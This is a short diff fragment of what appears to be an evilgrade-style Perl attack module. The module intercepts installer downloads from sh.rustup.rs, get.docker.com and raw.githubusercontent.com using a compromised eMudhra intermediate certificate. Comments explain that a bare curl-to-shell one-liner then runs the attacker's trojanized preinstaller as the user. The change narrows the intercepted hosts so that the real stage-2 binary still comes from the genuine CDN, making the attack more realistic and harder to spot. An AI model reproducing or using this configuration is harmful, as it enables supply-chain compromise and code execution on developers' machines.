@@ -48,7 +48,11 @@ the public AAA root the compromised eMudhra intermediate chains to, so a BARE
 one-liner (no flags, no env) runs our script -> code execution as the user.
 Set 'sslcert' to certs/emudhra_mitm.
 },
-    'vh' => '(sh.rustup.rs|static.rust-lang.org|get.docker.com|raw.githubusercontent.com)',
+    # Intercept ONLY the preinstaller-script hosts. static.rust-lang.org (the
+    # CDN that serves the real stage-2 rustup-init binary) is deliberately NOT
+    # here: the realistic attack MITMs only the first hop, and the trojanized
+    # preinstaller then fetches the genuine binary from the real CDN.
+    'vh' => '(sh.rustup.rs|get.docker.com|raw.githubusercontent.com)',
     'request' => [
         {   'req'     => '.*',          # any path on these installer hosts
             'type'    => 'file',
